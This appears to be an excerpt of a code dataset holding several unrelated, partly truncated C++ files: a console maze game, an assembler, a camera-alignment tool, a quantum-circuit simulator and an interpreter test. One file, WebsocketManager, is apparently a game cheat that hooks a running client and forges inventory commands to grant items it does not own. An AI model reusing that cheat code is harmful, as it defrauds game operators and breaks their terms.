(i==1||i==row-1||j==1||j==col-1) {\n                cout<<\" *\";\n            }\n            else if (i!=1&&i%2==1&& j%2==1) {\n                cout<<\"xx\";\n            }\n            else if (i==18&&j==17){\n                cout<<\"<>\";\n            }\n            else if (i==x&&j==y)\n                cout<<\" \"<<ground[x][y];\n            else {\n                ran=(rand()%20);\n                if ((ran%100==0)){\n                    ground[i][j]='E';\n                    cout<<ground[i][j]<<\" \";}\n                else if(ran%15==0){\n                    ground[i][j]='=';\n                    cout<<ground[i][j]<<\" \";}\n                else\n                    cout<<\"  \";\n            }\n        }\n        cout<<endl;\n    }\n}\nvoid easyB(char ground[row][col],int x,int y)\n{\n    ground[x][y] = 'S';\n    int ran;\n    srand(time_t(0));\n    for (int i=1; i<row; i++) {\n        for (int j=1; j<col; j++) {\n            if (i==1||i==row-1||j==1||j==col-1) {\n                cout<<\" *\";\n            }\n            else if (i!=1&&i%2==1&& j%2==1) {\n                cout<<\"XX\";\n            }\n            else if (i==18&&j==17){\n                cout<<\"<>\";\n            }\n            else if (i==x&&j==y){\n                cout<<\" \"<<ground[x][y];\n                ++j;\n                ground[i][j]='B';\n                cout<<\"  \"<<ground[i][j];\n                ++j;\n                ground[i][j]='!';\n                cout<<ground[i][j];\n            }\n            else {\n                ran=(rand()%20);\n                if ((ran%100==0)){\n                    ground[i][j]='E';\n                    cout<<ground[i][j]<<\" \";}\n                else if(ran%15==0){\n                    ground[i][j]='=';\n                    cout<<ground[i][j]<<\" \";}\n                else\n                    cout<<\"  \";\n            }\n        }\n        cout<<endl;\n    }\n}\nvoid easygame()\n{\n    score m,t,cb;\n    void menu();\n    const int wm=1,wb=2,wt=1;\n    char ground[row][col];\n    int x=2,y=2;\n    char ans;\n    int count=0;\n    int countB=0;\n    auto start=high_resolution_clock::now();\n    space();\n    easyplayground(ground,x,y);\n    while (x!=18||y!=17) {\n        cout<<\"EASY LEVEL\\nmove...\";\n        cin>>ans;\n        switch (ans) {\n            case 'w':\n                --x;\n                space();\n                ground[x][y]='S';\n                easyplayground(ground,x,y);\n                space();\n                break;\n            case 's':\n                ++x;\n                space();\n                ground[x][y]='S';\n                easyplayground(ground, x,y);\n                space();\n                break;\n            case 'a':\n                --y;\n                space();\n                ground[x][y]='S';\n                easyplayground(ground,x,y);\n                space();\n                break;\n            case 'd':\n                ++y;\n                space();\n                ground[x][y]='S';\n                ea",
    "//============================================================================\n// Name        : assembler.cpp\n// Author      : Kabir Athwal\n// Version     : 2.0\n//============================================================================\n\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <sstream>\n#include <unordered_map>\nusing namespace std;\n\nint main(int argc, char * argv[]) {\n// int argc, char * argv[]\n\n\n// declarations, maps\n\tfstream inFile;\n//\tinFile.open(\"my_instructions.txt\");\n\tinFile.open(argv[1]);\n\n\tunordered_map<string, string> instructions;\n\tinstructions[\"LDA\"] = \"00\";\n\tinstructions[\"LDX\"] = \"01\";\n\tinstructions[\"LDS\"] = \"02\";\n\tinstructions[\"LDF\"] = \"03\";\n\tinstructions[\"STA\"] = \"04\";\n\tinstructions[\"STX\"] = \"05\";\n\tinstructions[\"STS\"] = \"06\";\n\tinstructions[\"STF\"] = \"07\";\n\tinstructions[\"PSH\"] = \"08\";\n\tinstructions[\"POP\"] = \"09\";\n\tinstructions[\"CLR\"] = \"0A\";\n\tinstructions[\"SET\"] = \"0B\";\n\tinstructions[\"PSHA\"] = \"FFF010\";\n\tinstructions[\"PSHX\"] = \"FFF011\";\n\tinstructions[\"PSHF\"] = \"FFF012\";\n\tinstructions[\"POPA\"] = \"FFF013\";\n\tinstructions[\"POPX\"] = \"FFF014\";\n\tinstructions[\"POPF\"] = \"FFF015\";\n\tinstructions[\"ADA\"] = \"10\";\n\tinstructions[\"ADX\"] = \"11\";\n\tinstructions[\"ADS\"] = \"12\";\n\tinstructions[\"ADF\"] = \"13\";\n\tinstructions[\"SBA\"] = \"14\";\n\tinstructions[\"SBX\"] = \"15\";\n\tinstructions[\"SBS\"] = \"16\";\n\tinstructions[\"SBF\"] = \"17\";\n\tinstructions[\"MUL\"] = \"18\";\n\tinstructions[\"DIV\"] = \"19\";\n\tinstructions[\"MOD\"] = \"1A\";\n\tinstructions[\"CMA\"] = \"20\";\n\tinstructions[\"CMX\"] = \"21\";\n\tinstructions[\"CMS\"] = \"22\";\n\tinstructions[\"CMF\"] = \"23\";\n\tinstructions[\"SHRA\"] = \"FFF022\";\n\tinstructions[\"SHLA\"] = \"FFF023\";\n\tinstructions[\"JSR\"] = \"41\";\n\tinstructions[\"RTN\"] = \"FFF040\";\n\tinstructions[\"JEQ\"] = \"48\";\n\tinstructions[\"JLT\"] = \"4A\";\n\tinstructions[\"JGE\"] = \"4B\";\n\tinstructions[\"NOP\"] = \"FFF038\";\n\tinstructions[\"HLT\"] = \"FFFFFF\";\n\n\tunordered_map<string, string> addrMode;\n\taddrMode[\"#\"] = \"0\";\n\taddrMode[\"+\"] = \"4\";\n\taddrMode[\"*\"] = \"6\";\n\taddrMode[\"&\"] = \"8\";\n\taddrMode[\"# !\"] = \"1\";\n\taddrMode[\"!\"] = \"3\";\n\taddrMode[\"+ !\"] = \"5\";\n\taddrMode[\"* !\"] = \"7\";\n\taddrMode[\"& !\"] = \"9\";\n\n\tunordered_map<string, string> labels;\n\n// PASS ONE (adds labels and instructions)\n\tstring temp;\n\tint counter = 0;\n\n\twhile(inFile >> temp)\n\t{\n//\t\tcout << temp << endl;\n\n\t\tint tempLen = temp.length() - 1;\n\n\t\tif(temp[tempLen] == ':')\n\t\t{\n\t\t\tif(counter <= 9)\n\t\t\t{\n\t\t\t\ttemp.erase(tempLen, tempLen);\n\n\t\t\t\tauto it = labels.find(temp);\n\t\t\t\tif(it != instructions.end())\n\t\t\t\t{\n\t\t\t\t\tcerr << \"ASSEMBLER ERROR: label defined multiple times.\" << endl;\n\t\t\t\t}\n\n\n\t\t\t\tlabels[temp] = \"00\" + to_string(counter);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tchar t = char(55 + counter);\n\t\t\t\tstring tt = \"00\";\n\t\t\t\ttt += t;\n\n\t\t\t\ttemp.erase(tempLen, tempLen);\n\n\t\t\t\tauto it = labels.find(temp);\n\t\t\t\tif(it != instructions.end())\n\t\t\t\t{\n\t\t\t\t\tcerr << \"ASSEMBLER ERROR: label defined multiple times.\" << endl;\n\t\t\t\t}\n\n\t\t\t\tlabels[temp] = tt;\n\t\t\t}\n\t\t}\n\n\t\tint len = temp.length();\n\t\tif(len == 3 and isupper(temp[0]) and temp != \"HLT\" and temp != \"NOP\" and temp != \"RTN\")\n\t\t{\n\t\t\tstring t1, t2, t3;\n\n\t\t\tinFile >> t1;\n\n//\t\t\tcout << temp << \" \";\t\t\t\t\t\t// OUTPUT\n//\t\t\tcout << \"t1: \" << t1 << \" \";\t\t\t\t// OUTPUT\n\n\t\t\tif(t1 == \"#\" or t1 == \"+\" or t1 == \"*\" or t1 == \"!\" or t1 == \"+\" or t1 == \"&\")\n\t\t\t{\n\t\t\t\tinFile >> t2;\n\n//\t\t\t\tcout << \"t2: \" << t2 << \" \";\t\t\t// OUTPUT\n\n\t\t\t\tif(t2 == \"#\" or t2 == \"+\" or t2 == \"*\" or t2 == \"!\" or t2 == \"+\" or t2 == \"&\")\n\t\t\t\t{\n\t\t\t\t\tinFile >> t3;\n\n//\t\t\t\t\tcout << \"t3: \" <<  t3 << endl;\t\t// OUTPUT\n\t\t\t\t\tstring t32;\n\n\t\t\t\t\tif(t3[0] == '$')\n\t\t\t\t\t{\n\t\t\t\t\t\tt32 = t3;\n\t\t\t\t\t\tt32.erase(0, 1);\n\n//\t\t\t\t\t\tcout << \"\\nT3 TRY 2 \" << t32 << endl << endl;\t\t\t\t// OUTPUT\n\t\t\t\t\t}\n\t\t\t\t\telse\t\t\t\t\t\t\t// fix to base 16 if no $\n\t\t\t\t\t{\n\t\t\t\t\t\tt32 = t3;\n\t\t\t\t\t\tint base16 = stoi(t32);\n\t\t\t\t\t\tstring b16 = \"0123456789ABCDEF\";\n\t\t\t\t\t\tstring base16Final;\n\n\t\t\t\t\t    while(base16 > 0)\n\t\t\t\t\t    {\n\t\t\t\t\t    \tbase16Final = b16[base16 % 16] + base16Final;\n\t\t\t\t\t    \tbase16 /= 16;\n\t\t\t\t\t    }\n\n\t\t\t\t\t    t32 = base16Final;\n\t\t\t\t\t}\n\n\t\t\t\t\tint t32Len = 3 - t32.length();\n\t\t\t\t\tfor(int i = 0; i < t32Len; i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tt32 = \"0\" + t32;\n\t\t\t\t\t}\n\n//\t\t\t\t\tcout << \"\\nT3 TRY 2P2 \" << t32 << endl << endl;\t\t// OUTPUT\n\n\t\t\t\t\tlabels[t3] = t32;\n\t\t\t\t}\n\t\t\t\tif(isdigit(t2[0]) or isdigit(t2[1]) or isupper(t2[0]) or isupper(t2[1]))\n\t\t\t\t{\n\t\t\t\t\tstring t22;\n\n\t\t\t\t\tif(t2[0] == '$')\n\t\t\t\t\t{\n\t\t\t\t\t\tt22 = t2;\n\t\t\t\t\t\tt22.erase(0, 1);\n\n//\t\t\t\t\t\tcout << \"\\nT2 TRY 2 \" << t22 << endl << endl;\t\t// OUTPUT\n\t\t\t\t\t}\n\t\t\t\t\telse\t\t\t\t\t\t// fix to base 16 if no $\n\t\t\t\t\t{\n\t\t\t\t\t\tt22 = t2;\n\t\t\t\t\t\tint base16 = stoi(t22);\n\t\t\t\t\t\tstring b16 = \"0123456789ABCDEF\";\n\t\t\t\t\t\tstring base16Final;\n\n\t\t\t\t\t    while(base16 > 0)\n\t\t\t\t\t    {\n\t\t\t\t\t    \tbase16Final = b16[base16 % 16] + base16Final;\n\t\t\t\t\t    \tbase16 /= 16;\n\t\t\t\t\t    }\n\n\t\t\t\t\t    t22 = base16Final;\n\t\t\t\t\t}\n\n\t\t\t\t\tint t22Len = 3 - t22.length();\n\t\t\t\t\tfor(int i = 0; i < t22Len; i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tt22 = \"0\" + t22;\n\t\t\t\t\t}\n\n//\t\t\t\t\tcout << \"\\nT2 TRY 2P2 \" << t22 << endl << endl;\t\t// OUTPUT\n\n\t\t\t\t\tlabels[t2] = t22;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(isdigit(t1[0]) or isdigit(t1[1]) or isupper(t1[0]) or isupper(",
    "#include \"WebsocketManager.h\"\r\n\r\nWebsocketManager::WebsocketManager(void* wsmi) : wsmi(wsmi), playerlevel(1), version(\"25.0.1\") {};\r\nstd::unordered_map<int, std::unique_ptr<json>> command_params = {};\r\n\r\nstd::string WebsocketManager::rand_hex() {\r\n    std::random_device rd;\r\n    std::mt19937 gen(rd());\r\n    std::uniform_int_distribution<> distrib(0, 255);\r\n    std::stringstream ss;\r\n    for (int i = 0; i < 4; i++) {\r\n        ss << std::hex << std::setw(2) << std::setfill('0') << distrib(gen);\r\n    }\r\n    return ss.str();\r\n}\r\n\r\njson WebsocketManager::createCommand(std::string cmdID, json payload, std::vector<int> u) {\r\n    return {\r\n        {OBF(\"id\"), commandIDs.at(cmdID)},\r\n        {OBF(\"i\"), WebsocketManager::rand_hex()},\r\n        {OBF(\"p\"), payload},\r\n        {OBF(\"h\"), json::object()},\r\n        {OBF(\"v\"), this->version},\r\n        {OBF(\"u\"), u}\r\n    };\r\n}\r\n\r\nvoid* WebsocketManager::dict_from_json(json payload) {\r\n    return dictionaryFromJson(NewIl2cppString(payload.dump()));\r\n}\r\n\r\nvoid WebsocketManager::setversion(std::string version) {\r\n    this->version = version;\r\n}\r\n\r\nvoid WebsocketManager::set_playerid(std::string id) {\r\n    this->playerid = std::atoi(id.c_str());\r\n}\r\n\r\nvoid* WebsocketManager::get_wsmi() {\r\n    return this->wsmi;\r\n}\r\n\r\nint WebsocketManager::SendWebsocket(il2cppString* event, void* payload, std::function<void(json &)> callback ) {\r\n    this->playerlevel = ExperienceController::get_CurrentLevel();\r\n    if (this->wsmi != nullptr) {\r\n        int currentID = *(int *) ((uint64_t) this->wsmi + 0x38); // request id\r\n        // fslog::info(\"current id: {}\", currentID);\r\n        if (callback != nullptr) {\r\n            response_callbacks.insert(std::make_pair(currentID, callback));\r\n        }\r\n        \r\n        return Websocket::send(this->wsmi, event, payload);\r\n    } else {\r\n        ImGui::InsertNotification({ImGuiToastType::Error, 1500, OBF(\"WebsocketManager is null!\")});\r\n    }\r\n    return 0;\r\n}\r\n\r\nint WebsocketManager::SendWebsocket2(const json& request, std::function<void(json &)> callback ) {\r\n    this->playerlevel = ExperienceController::get_CurrentLevel();\r\n    if (this->wsmi != nullptr) {\r\n        int currentID = *(int *) ((uint64_t) this->wsmi + 0x38);\r\n        if (callback != nullptr) {\r\n            response_callbacks.insert(std::make_pair(currentID, callback));\r\n        }\r\n        \r\n        fslog::info(\"req: {}\", request.dump());\r\n        std::string commandPayload = request[0];\r\n        Websocket::sendCommand(this->wsmi, NewIl2cppString(commandPayload.c_str()));\r\n    } else {\r\n        ImGui::InsertNotification({ImGuiToastType::Error, 1500, OBF(\"WebsocketManager is null!\")});\r\n    }\r\n    return 0;\r\n}\r\n\r\n\r\nint WebsocketManager::callWebsocket(const json &request, std::function<void(json &)> callback) {\r\n    if (this->wsmi == nullptr) {\r\n        return -1;\r\n    }\r\n\r\n    std::string eventName = request[0];\r\n\r\n    int currentID = *(int *) ((uint64_t) this->wsmi + 0x38);\r\n    if (callback != nullptr) {\r\n        response_callbacks.insert(std::make_pair(currentID, callback));\r\n    }\r\n    command_params.insert(std::make_pair(currentID, std::make_unique<json>(request)));\r\n    fslog::info(\"Sending command {} with id {}\", eventName.c_str(), currentID);\r\n    fslog::debug(\"Request: {}\", request.dump().c_str());\r\n    Websocket::sendCommand(this->wsmi, NewIl2cppString(eventName.c_str()));\r\n    return currentID;\r\n}\r\n\r\nvoid WebsocketManager::reloadws() {\r\n    if (Features::Settings::autoreloadws) {\r\n        void* dict = this->dict_from_json(json::parse(R\"( {} )\"));\r\n        this->SendWebsocket(NewIl2cppString(OBF(\"update_progress\")), dict);\r\n    }\r\n}\r\n\r\n\r\n\r\nvoid WebsocketManager::_reloadws() {\r\n    void* dict = this->dict_from_json(json::parse(R\"( {} )\"));\r\n\r\n    json empty = {{}};\r\n    json reloadp = json::array({\"update_progress\", empty});\r\n    this->SendWebsocket(NewIl2cppString(OBF(\"update_progress\")), dict);\r\n    // this->callWebsocket(reloadp);\r\n}\r\n\r\nvoid WebsocketManager::add_wepskins(int index) {\r\n        json commands;\r\n        if (index == 0) {\r\n            for (int i = 1; i < 2000; i++) {\r\n                if ((i >= 496 && i <= 513) || (i >= 531 && i <= 541) || (i == 547))\r\n                    continue;\r\n                commands.push_back(\r\n                        this->createCommand(OBF(\"InventoryAddItemSingle\"), {{\"i\", i * 1000 + 14}}));\r\n            }\r\n        } else {\r\n            commands.push_back(\r\n                    this->createCommand(OBF(\"InventoryAddItemSingle\"), {{\"i\", index * 1000 + 14}}));\r\n        }\r\n\r\n        json result = {\r\n                {OBF(\"id\"), commandIDs.at(OBF(\"Snapshot\"))},\r\n                {OBF(\"i\"),  WebsocketManager::rand_hex()},\r\n                {OBF(\"p\"),  {{\"c\", commands}}},\r\n                {OBF(\"u\"), {140, 6}}\r\n        };\r\n\r\n        void* dict = this->dict_from_json(result);\r\n        this->SendWebsocket(NewIl2cppString(OBF(\"update_progress\")), dict);\r\n}\r\n\r\nvoid WebsocketManager::add_modules(int index, int amount) {\r\n    json commands;\r\n    if (index =",
    "#include <filesystem>\r\n#include <vector>\r\n#include <map>\r\n#include <iomanip>\r\n#include <argparse/argparse.hpp>\r\n#include <Eigen/Eigen>\r\n\r\n#include \"Reconstruction.hpp\"\r\n#include \"KRT.hpp\"\r\n#include \"FeatureDatabase.hpp\"\r\n#include \"BundleAdjuster.hpp\"\r\n\r\n/**\r\n  * @brief Align the reconstruction's coordinate system to KRT's coordinate system.\r\n  *\r\n  * This function performs ICP algorithm to align the reconstruction's coordinate system to\r\n  * KRT's coordinate system. The camera extrinsics and 3D points in the reconstruction will be\r\n  * transformed.\r\n  * \r\n  * @param reconstruction \tThe reconstruction to be aligned.\r\n  * @param krt \t\t\t\tThe KRT data.\r\n  * @return The mean squared distance of cameras after alignment.\r\n  */\r\ndouble alignCoordinateSystems(\r\n\tconst KRT& krt,\r\n\tReconstruction& reconstruction\r\n) {\r\n\t// Convert extrinsics to point clouds.\r\n\tEigen::Matrix3Xd P(3, reconstruction.cameraDataMap.size());\r\n\tEigen::Matrix3Xd Q(3, reconstruction.cameraDataMap.size());\r\n\tstd::size_t cnt = 0;\r\n\tfor (const auto& cameraDataEntry : reconstruction.cameraDataMap) {\r\n\t\tstd::uint64_t cameraName = cameraDataEntry.first;\r\n\t\tconst Reconstruction::CameraData& reconCameraData = cameraDataEntry.second;\r\n\t\tconst KRT::CameraParameters& krtCameraData = krt.cameraParametersMap.at(cameraName);\r\n\t\tP.col(cnt) = \r\n\t\t\t-Eigen::Matrix3d(\r\n\t\t\t\tEigen::AngleAxisd(reconCameraData.rotation.norm(), reconCameraData.rotation.normalized())\r\n\t\t\t).transpose() * reconCameraData.translation;\r\n\t\tQ.col(cnt) = \r\n\t\t\t-Eigen::Matrix3d(\r\n\t\t\t\tEigen::AngleAxisd(krtCameraData.rotation.norm(), krtCameraData.rotation.normalized())\r\n\t\t\t).transpose() * krtCameraData.translation;\r\n\t\t++cnt;\r\n\t}\r\n\tstd::cout << \"Mean squared distance of cameras before alignment: \" << (Q - P).array().square().sum() / static_cast<double>(reconstruction.cameraDataMap.size()) << std::endl;\r\n\t// Translate the point clouds' centroids to the origin.\r\n\tEigen::Vector3d centroidP = P.rowwise().mean();\r\n\tEigen::Vector3d centroidQ = Q.rowwise().mean();\r\n\tEigen::Matrix3Xd centeredP = P.colwise() - centroidP;\r\n\tEigen::Matrix3Xd centeredQ = Q.colwise() - centroidQ;\r\n\t// Solve for the scale and rotation.\r\n\tEigen::Matrix3d C = (centeredP * centeredQ.transpose()) / static_cast<double>(reconstruction.cameraDataMap.size());\r\n\tEigen::JacobiSVD<Eigen::Matrix3d, Eigen::ComputeFullU | Eigen::ComputeFullV> svd;\r\n\tsvd.compute(C, Eigen::ComputeFullU | Eigen::ComputeFullV);\r\n\tEigen::Matrix3d U = svd.matrixU();\r\n\tEigen::Vector3d S = svd.singularValues();\r\n\tEigen::Matrix3d V = svd.matrixV();\r\n\t// Make sure |V * U^T| is positive.\r\n\tif ((V * U.transpose()).determinant() < 0.0) {\r\n\t\tS[2] *= -1.0;\r\n\t\tU.col(2) *= -1.0;\r\n\t}\r\n\tEigen::Matrix3d rotation = V * U.transpose();\r\n\tdouble scale = S.sum() / (centeredP.array().square().sum() / static_cast<double>(reconstruction.cameraDataMap.size()));\r\n\t// Solve for the translation.\r\n\tEigen::Vector3d translation = centroidQ - scale * rotation * centroidP;\r\n\tEigen::Matrix3Xd transformedP = (scale * rotation * P).colwise() + translation;\r\n\t// Compute the error.\r\n\tdouble meanSquaredDistance = (Q - transformedP).array().square().sum() / static_cast<double>(reconstruction.cameraDataMap.size());\r\n\tstd::cout << \"Mean squared distance of cameras after alignment: \" << meanSquaredDistance << std::endl;\r\n\t// Transform camera extrinsics and 3D points in the reconstruction data.\r\n\tfor (auto& cameraDataEntry : reconstruction.cameraDataMap) {\r\n\t\tReconstruction::CameraData& cameraData = cameraDataEntry.second;\r\n\t\tEigen::Matrix3d R0 = Eigen::AngleAxisd(cameraData.rotation.norm(), cameraData.rotation.normalized()).matrix();\r\n\t\tEigen::AngleAxisd angleAxis = Eigen::AngleAxisd(R0 * rotation.transpose());\r\n\t\tcameraData.rotation = angleAxis.axis() * angleAxis.angle();\r\n\t\tcameraData.translation = scale * cameraData.translation - R0 * rotation.transpose() * translation;\r\n\t}\r\n\tfor (auto& point3D : reconstruction.point3Ds) {\r\n\t\tpoint3D.position = scale * rotation * point3D.position + translation;\r\n\t}\r\n\t// Return the mean squared distance.\r\n\treturn meanSquaredDistance;\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n\r\n\tgoogle::InitGoogleLogging(argv[0]);\r\n\t\r\n\t// Parse arguments\r\n\tBundleAdjusterParameters bundleAdjusterParameters{}; // Default parameters.\r\n\targparse::ArgumentParser program(\"Camera Calibration\", \"1.0\");\r\n\tprogram\r\n\t\t.add_argument(\"reconstruction\")\r\n\t\t.help(\"Path to the COLMAP/PixelSfM reconstruction results.\");\r\n\tprogram\r\n\t\t.add_argument(\"feature\")\r\n\t\t.help(\"Path to the dense feature database. If lambda3 is 0, this argument is ignored.\");\r\n\tprogram\r\n\t\t.add_argument(\"KRT\")\r\n\t\t.help(\"Path to KRT.\");\r\n\tprogram\r\n\t\t.add_argument(\"--output\")\r\n\t\t.help(\"Path to the output directory. If not specified, the results won't be saved.\")\r\n\t\t.nargs(1)\r\n\t\t.default_value(\"\");\r\n\tprogram\r\n\t\t.add_argument(\"--mode\")\r\n\t\t.help(\"0 for COLMAP, 1 for PixelSfM.\")\r\n\t\t.nargs(1)\r\n\t\t.scan<'i', int>()\r\n\t\t.choices(0, 1)\r\n\t\t.default_value(0);\r\n\tprogram\r\n\t\t.add_argument(\"--lambda0\")\r\n\t\t.help(\"The coefficient for reprojection loss.\"",
    "#include \"QuantumCircuit.hpp\"\n#include \"QuantumGates.hpp\"\n#include \"QuantumState.hpp\"  \n#include <iostream>\n#include <memory>  \n\n\n// initialize a circuit with n qubits\nQuantumCircuit::QuantumCircuit(int nQubit) \n    : nQubit(nQubit) {\n\n        // instantiate state\n        state = std::make_unique<QuantumState>(*this);\n}\n\n// add H gate to the container\nvoid QuantumCircuit::H(int qubit){\n    this->container.push_back({\"H\",qubit}); \n}\n\n// add X gate to the container\nvoid QuantumCircuit::X(int qubit){\n    this->container.push_back({\"X\",qubit}); \n}\n\n// add Z gate to the container\nvoid QuantumCircuit::Z(int qubit){\n    this->container.push_back({\"Z\",qubit}); \n}\n\n// add Z gate to the container\nvoid QuantumCircuit::CNOT(int target, int control){\n    this->container.push_back({\"CNOT\", target, control}); \n}\n\n// return the combined transformation\nEigen::MatrixXcd QuantumCircuit::getCombTransform(QuantumGates<>& gateObj){\n\n    // init\n    Eigen::MatrixXcd result = Eigen::MatrixXcd::Identity(pow(2,this->nQubit), pow(2,this->nQubit));\n\n    // loop and multiply\n    for ( unitOperator& op : this->container){\n        // get representation\n        Eigen::MatrixXcd representation = gateObj.getRepresentation(op.gateName, this->nQubit, op.target, op.control);\n        result *= representation;\n    }\n    return result;\n}\n\n\n// display the container visually\nvoid QuantumCircuit::display(){\n\n    std::cout << \"\\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\";\n    std::cout << \"\\n\u2551     Quantum Circuit    \u2551\";\n    std::cout << \"\\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\n\\n\";\n    \n    // loop throguh \"a\" qubit, and add operators belonging to it\n    for (int q = 1; q < this->nQubit + 1 ; q++){\n        std::cout << \"q\" << q << \":  \"; \n\n            // lopp through gates and Print gates beloning to a qubit\n            for (auto& op : container){\n                if (op.target == q || op.control == q) {\n                    if (op.gateName == \"H\") {\n                        std::cout << \"\u2500[H]\u2500\";\n                    }\n                    else if (op.gateName == \"X\") {\n                        std::cout << \"\u2500[X]\u2500\";\n                    }\n                    else if (op.gateName == \"Z\") {\n                        std::cout << \"\u2500[Z]\u2500\";\n                    }\n                    else if (op.gateName == \"CNOT\") {\n                        if (q == op.control) {\n                            std::cout << \"\u2500\u2500\u25cf\u2500\u2500\";  \n                        }\n                        else if (q == op.target) {\n                             std::cout << \"\u2500\u2500\u2295\u2500\u2500\";  \n                        }\n                    }\n                }\n                else {\n                std::cout << \"\u2500\u2500\u2500\u2500\u2500\";  \n                }\n\n            }\n        std::cout << \"\\n\";\n    }\n    std::cout << \"\\n\"; \n}\n\n// clear\nvoid QuantumCircuit::clear() {\n    container.clear();\n}\n\n// transform the state vector from dynamic state object\nvoid QuantumCircuit::transformState(){\n    QuantumGates<> gates;\n    Eigen::MatrixXcd finalTransform = getCombTransform(gates);\n    state->transformState(finalTransform);\n}",
    "#include <memory>\n#include <catch.hpp>\n#include \"../src/core_timing.h\"\n#include \"../src/interpreter.h\"\n#include \"../src/memory_interface.h\"\n#include \"../src/shared_memory.h\"\n\nTEST_CASE(\"Cycle accuracy\", \"[interpreter]\") {\n    Teakra::CoreTiming core_timing;\n    Teakra::SharedMemory shared_memory;\n    Teakra::MemoryInterfaceUnit miu;\n    Teakra::MemoryInterface memory_interface{shared_memory, miu};\n    Teakra::RegisterState regs;\n    Teakra::Interpreter interpreter(core_timing, regs, memory_interface);\n\n    regs.pc = 0;\n    regs.a[0] = 0;\n    regs.a[1] = 0;\n    regs.ie = 1;\n    regs.im[0] = 1;\n\n    memory_interface.ProgramWrite(0x0000, 0x4180); // br (RESET vector)\n\n    memory_interface.ProgramWrite(0x0006, 0x4180); // br (INT0 vector)\n    memory_interface.ProgramWrite(0x0007, 0x2000); // br 0x2000\n\n    for (u32 i = 0; i < 16; ++i) {\n        memory_interface.ProgramWrite(0x1000 + i, 0x67D0); // inc a0\n        memory_interface.ProgramWrite(0x2000 + i, 0x77D0); // inc a1\n    }\n\n    memory_interface.ProgramWrite(0x1010, 0x57F0); // brr -1\n\n    class InterruptGenerator : public Teakra::CoreTiming::Callbacks {\n        Teakra::Interpreter& interpreter;\n        u64 counter = 0;\n\n    public:\n        InterruptGenerator(Teakra::Interpreter& interpreter) : interpreter(interpreter) {}\n\n        void SetCounter(u64 new_counter) {\n            counter = new_counter;\n        }\n\n        void Tick() override {\n            if (counter != 0) {\n                --counter;\n                if (counter == 0) {\n                    interpreter.SignalInterrupt(0);\n                }\n            }\n        }\n\n        u64 GetMaxSkip() const override {\n            if (counter != 0) {\n                return counter - 1;\n            } else {\n                return Infinity;\n            }\n        }\n\n        void Skip(u64 ticks) override {\n            if (counter != 0) {\n                counter -= ticks;\n            }\n        }\n    };\n\n    InterruptGenerator interrupt_generator(interpreter);\n    interrupt_generator.SetCounter(7);\n    core_timing.RegisterCallbacks(&interrupt_generator);\n\n    SECTION(\"Simple counting\") {\n        memory_interface.ProgramWrite(0x0001, 0x1000);\n        interpreter.Run(1 + 5);\n        REQUIRE(regs.a[0] == 5);\n        REQUIRE(regs.a[1] == 0);\n    }\n\n    SECTION(\"Counting with interrupt\") {\n        memory_interface.ProgramWrite(0x0001, 0x1000);\n        interpreter.Run(1 + 7 + 1 + 3);\n        REQUIRE(regs.a[0] == 7);\n        REQUIRE(regs.a[1] == 3);\n    }\n\n    SECTION(\"Counting with idle and interrupt\") {\n        memory_interface.ProgramWrite(0x0001, 0x100D);\n        interpreter.Run(1 + 6);\n        REQUIRE(regs.a[0] == 3);\n        REQUIRE(regs.a[1] == 0);\n\n        interpreter.Run(3);\n        REQUIRE(regs.a[0] == 3);\n        REQUIRE(regs.a[1] == 1);\n    }\n\n    SECTION(\"Counting with idle and interrupt 2\") {\n        memory_interface.ProgramWrite(0x0001, 0x100D);\n        interpreter.Run(1 + 7);\n        REQUIRE(regs.a[0] == 3);\n        REQUIRE(regs.a[1] == 0);\n\n        interpreter.Run(3);\n        REQUIRE(regs.a[0] == 3);\n        REQUIRE(regs.a[1] == 2);\n    }\n\n    SECTION(\"Counting with idle and interrupt 3\") {\n        memory_interface.ProgramWrite(0x0001, 0x100D);\n        interpreter.Run(1 + 7 + 1 + 2);\n        REQUIRE(regs.a[0] == 3);\n        REQUIRE(regs.a[1] == 2);\n    }\n\n    SECTION(\"Idle with interrupt 1\") {\n        memory_interface.ProgramWrite(0x0001, 0x1010);\n        interpreter.Run(1 + 7 + 1 + 2);\n        REQUIRE(regs.a[0] == 0);\n        REQUIRE(regs.a[1] == 2);\n    }\n\n    SECTION(\"Idle with interrupt 2\") {\n        memory_interface.ProgramWrite(0x0001, 0x1010);\n        interpreter.Run(1 + 7);\n        REQUIRE(regs.a[0] == 0);\n        REQUIRE(regs.a[1] == 0);\n\n        interpreter.Run(1 + 2);\n        REQUIRE(regs.a[0] == 0);\n        REQUIRE(regs.a[1] == 2);\n    }\n\n    SECTION(\"Idle with interrupt 3\") {\n        memory_interface.ProgramWrite(0x0001, 0x1010);\n        interpreter.Run(1 + 6);\n        REQUIRE(regs.a[0] == 0);\n        REQUIRE(regs.a[1] == 0);\n\n        SECTION(\"Single step on the interrupt\") {\n            interpreter.Run(1);\n            REQUIRE(regs.a[0] == 0);\n            REQUIRE(regs.a[1] == 0);\n\n            interpreter.Run(1 + 2);\n            REQUIRE(regs.a[0] == 0);\n            REQUIRE(regs.a[1] == 2);\n        }\n\n        SECTION(\"Run over the interrupt\") {\n            interpreter.Run(1 + 1 + 2);\n            REQUIRE(regs.a[0] == 0);\n            REQUIRE(regs.a[1] == 2);\n        }\n    }\n}\n",
